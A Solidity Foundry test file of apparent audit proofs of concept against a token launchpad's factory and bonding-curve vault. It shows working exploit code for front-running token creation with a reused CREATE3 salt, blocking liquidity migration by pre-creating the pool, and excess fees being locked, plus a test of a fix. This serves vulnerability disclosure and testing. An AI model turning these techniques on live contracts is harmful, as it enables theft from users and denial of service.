// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {Base, console, BuzzToken, ICREATE3Factory, IWeightedPoolFactory, IRateProvider, IERC20, ERC20} from "../Base.t.sol";
import {BuzzVaultExponential as BuzzVaultExponentialFixed} from "./utils/BuzzVaultExponentialFixed.sol";

import {IWeightedPool} from "../../../contracts/interfaces/bex/IWeightedPool.sol";
import {IVault} from "@balancer-labs/v2-interfaces/contracts/vault/IVault.sol";
import {IAsset} from "@balancer-labs/v2-interfaces/contracts/vault/IAsset.sol";
import "@balancer-labs/v2-interfaces/contracts/standalone-utils/IProtocolFeePercentagesProvider.sol";

contract POC is Base {
    BuzzVaultExponentialFixed internal buzzVaultExponentialFixed;

    function setUp() public override {
        super.setUp();

        vm.startPrank(_OWNER);

        buzzVaultExponentialFixed = new BuzzVaultExponentialFixed(
            address(feeManager),
            address(buzzTokenFactory),
            address(referralManager),
            address(bexLiquidityManager),
            address(wBERA)
        );

        // Set the vault as whitelisted to allow the protocol to interact with the referral manager.
        referralManager.setWhitelistedVault(
            address(buzzVaultExponentialFixed),
            true
        );

        // Set the exponential vault as whitelisted to allow the factory to create tokensfor specific bonding curves (vaults).
        buzzTokenFactory.setVault(address(buzzVaultExponentialFixed), true);

        // Set the exponential vault to have permission to interact with the liquidity manager.
        address[] memory vaults = new address[](1);
        vaults[0] = address(buzzVaultExponentialFixed);
        bexLiquidityManager.addVaults(vaults);

        vm.stopPrank();
    }

    function test_poc_excess_native_token_not_reembursed() public {
        // Get the cost of the listing fee in the native token.
        uint256 listingFee = feeManager.listingFee();

        // Give twice the amount of the listing fee to the user.
        deal(_USER, listingFee * 2);

        // Create a new token via the factory.
        string[2] memory metadata;
        metadata[0] = "Memecoin";
        metadata[1] = "MEME";

        address[2] memory addr;
        addr[0] = address(wBERA);
        addr[1] = address(buzzVaultExponential);

        uint256[2] memory raiseData;
        raiseData[0] = 1e18;
        raiseData[1] = 1000e18;

        vm.prank(_USER);
        buzzTokenFactory.createToken{value: listingFee * 2}(
            metadata,
            addr,
            raiseData,
            0,
            keccak256("MEME")
        );

        // Assert that the amount sent in excess is not reembursed.
        assertEq(_USER.balance, 0);

        // Assert that the treasury has only received the listing fee.
        assertEq(address(_TREASURY).balance, listingFee);

        // Assert that the remaning amount is locked in the factory forever.
        assertEq(address(buzzTokenFactory).balance, listingFee);
    }

    function test_poc_frontrunning_token_creation() public {
        // Give BERA to pay for the listing fee to both Alice and Bob.
        uint256 listingFee = feeManager.listingFee();
        deal(_ALICE, listingFee);
        deal(_BOB, listingFee);

        // Give NECT to Alice for her to perform the first buy of the token she wants to create.
        uint256 buyAmount = 100e18;
        deal(address(NECT), _ALICE, buyAmount);

        // Alice approves the buzz vault exponential to spend NECT.
        vm.prank(_ALICE);
        NECT.approve(address(buzzVaultExponential), buyAmount);

        // Alice precomputes the address of the token that she will create.
        address aliceToken = ICREATE3Factory(_CREATE3_DEPLOYER).getDeployed(
            address(buzzTokenFactory),
            keccak256("0x1337")
        );

        // Bob frontruns Alice and creates a new token with the same base token and salt as Alice.
        // Bob also uses the same initial and final reserve amounts as Alice to make sure that her
        // transaction does not revert due to slippage protection.
        string[2] memory metadata;
        metadata[0] = "Bob Memecoin";
        metadata[1] = "BOBMEME";

        address[2] memory addr;
        addr[0] = address(NECT);
        addr[1] = address(buzzVaultExponential);

        uint256[2] memory raise;
        raise[0] = 1e18;
        raise[1] = 1000e18;

        vm.prank(_BOB);
        address bobToken = buzzTokenFactory.createToken{value: listingFee}(
            metadata,
            addr,
            raise,
            0,
            keccak256("0x1337")
        );

        // Alice's transaction to create a new token will revert because a token is already deployed at
        // the pre-computed address she was expecting to deploy her token.
        metadata[0] = "Alice Memecoin";
        metadata[1] = "ALICEMEME";

        addr[0] = address(NECT);
        addr[1] = address(buzzVaultExponential);

        raise[0] = 1e18;
        raise[1] = 1000e18;

        vm.prank(_ALICE);
        vm.expectRevert();
        buzzTokenFactory.createToken{value: listingFee}(
            metadata,
            addr,
            raise,
            buyAmount,
            keccak256("0x1337")
        );

        // Alice's initial buy will go through.
        uint256 quote = buzzVaultExponential.quote(aliceToken, buyAmount, true);
        vm.prank(_ALICE);
        buzzVaultExponential.buy(
            aliceToken,
            buyAmount,
            quote,
            address(0),
            _ALICE
        );

        // Assert that by frontrunning Alice's transaction, Bob's newly created token has the
        // same address as the one Alice was expecting to create.
        assertEq(bobToken, aliceToken);

        // Assert that the token alice thought she was creating is actually Bob's token.
        assertEq(BuzzToken(aliceToken).name(), "Bob Memecoin");
        assertEq(BuzzToken(aliceToken).symbol(), "BOBMEME");

        // Assert that Alice's buy went through and she bought Bob's token.
        assertEq(BuzzToken(aliceToken).balanceOf(_ALICE), quote);
    }

    function test_poc_liquidity_migration_dos() public {
        vm.label(_BEX_POOL_FACTORY, "WeightedPoolFactory");

        // Give BERA to both Alice and Bob to buy the buzz token with.
        deal(_ALICE, 50e18);
        deal(_BOB, 450e18);

        // Set the existing fees 0 to avoid any fees being charged.
        vm.startPrank(_OWNER);
        feeManager.setListingFee(0);
        feeManager.setTradingFeeBps(0);
        feeManager.setMigrationFeeBps(0);
        vm.stopPrank();

        // Alice creates a new buzz token via the buzz token factory with
        // an initial buy of 50 BERA.
        vm.startPrank(_ALICE);
        address token = buzzTokenFactory.createToken{value: 50e18}(
            ["AliceCoin", "AC"],
            [address(wBERA), address(buzzVaultExponential)],
            [uint256(1000e18), uint256(1500e18)],
            50e18,
            keccak256("0x1337")
        );
        vm.stopPrank();

        // An attacker creates a BEX 50/50 weighted pool with the same parameters
        // as the one that should be created by the liquidity manager once the liquidity is migrated.
        IERC20[] memory tokens = new IERC20[](2);
        tokens[0] = IERC20(address(wBERA));
        tokens[1] = IERC20(token);
        uint256[] memory weights = new uint256[](2);
        weights[0] = 0.5e18;
        weights[1] = 0.5e18;

        vm.startPrank(_ATTACKER);
        IWeightedPoolFactory(_BEX_POOL_FACTORY).create(
            string(
                abi.encodePacked(
                    "BEX 50 ",
                    ERC20(address(tokens[0])).symbol(),
                    " 50 ",
                    ERC20(address(tokens[1])).symbol()
                )
            ),
            string(
                abi.encodePacked(
                    "BEX-50",
                    ERC20(address(tokens[0])).symbol(),
                    "-50",
                    ERC20(address(tokens[1])).symbol()
                )
            ),
            tokens,
            weights,
            new IRateProvider[](2),
            0.01e18,
            address(bexLiquidityManager),
            keccak256(abi.encodePacked(address(wBERA), token))
        );
        vm.stopPrank();

        // Bob buys the remaining amount of Alice Coin with 450 BERA,
        // which triggers the liquidity migration.
        vm.startPrank(_BOB);
        // This transaction should revert with a create collision.
        vm.expectRevert();
        buzzVaultExponential.buyNative{value: 450e18}(
            token,
            0,
            address(0),
            _BOB
        );
        vm.stopPrank();
    }

    function test_fix() public {
        // Get the creation code of the WeightedPool.
        (bool success, bytes memory data) = _BEX_POOL_FACTORY.call(
            abi.encodeWithSignature("getCreationCode()")
        );
        require(success, "Failed to get creation code");

        // Encode the constructor arguments for the factory.
        bytes memory factoryConstructorArgs = abi.encode(
            _BEX_VAULT,
            IProtocolFeePercentagesProvider(
                0xC7c981ADcDC5d48fed0CD52807fb2bAB22676C8f
            ),
            address(bexLiquidityManager),
            "1.0.0",
            "1.0.0",
            abi.decode(data, (bytes))
        );

        // Deploy the BuzzWeightedPoolFactory to the factory address using the above constructor args.
        address factory = makeAddr("factory");
        deployCodeTo(
            "out/BuzzWeightedPoolFactory.sol/BuzzWeightedPoolFactory.json",
            factoryConstructorArgs,
            factory
        );

        IERC20[] memory tokens = new IERC20[](2);
        if (address(wBERA) < address(NECT)) {
            tokens[0] = IERC20(address(wBERA));
            tokens[1] = NECT;
        } else {
            tokens[0] = NECT;
            tokens[1] = IERC20(address(wBERA));
        }

        uint256[] memory weights = new uint256[](2);
        weights[0] = 0.5e18;
        weights[1] = 0.5e18;

        // Test the creation of a new pool.
        vm.startPrank(address(bexLiquidityManager));
        address pool = IWeightedPoolFactory(factory).create(
            string(
                abi.encodePacked(
                    "BEX 50 ",
                    ERC20(address(tokens[0])).symbol(),
                    " 50 ",
                    ERC20(address(tokens[1])).symbol()
                )
            ),
            string(
                abi.encodePacked(
                    "BEX-50",
                    ERC20(address(tokens[0])).symbol(),
                    "-50",
                    ERC20(address(tokens[1])).symbol()
                )
            ),
            tokens,
            weights,
            new IRateProvider[](2),
            0.01e18,
            address(bexLiquidityManager),
            keccak256(abi.encodePacked(address(wBERA), address(NECT)))
        );
        vm.stopPrank();

        // Deal wBERA and NECT to the user.
        deal(address(wBERA), address(bexLiquidityManager), 100e18);
        deal(address(NECT), address(bexLiquidityManager), 100e18);

        // Create the joining pool request
        IAsset[] memory assets = new IAsset[](2);
        assets[0] = IAsset(address(tokens[0]));
        assets[1] = IAsset(address(tokens[1]));
        uint256[] memory amounts = new uint256[](2);
        amounts[0] = 100e18;
        amounts[1] = 100e18;
        IVault.JoinPoolRequest memory request = IVault.JoinPoolRequest(
            assets,
            amounts,
            abi.encode(0, amounts),
            false
        );

        // Join in the pool.
        vm.startPrank(address(bexLiquidityManager));
        wBERA.approve(_BEX_VAULT, 100e18);
        NECT.approve(_BEX_VAULT, 100e18);
        IVault(_BEX_VAULT).joinPool(
            IWeightedPool(pool).getPoolId(),
            address(bexLiquidityManager),
            address(bexLiquidityManager),
            request
        );
        vm.stopPrank();
    }
}
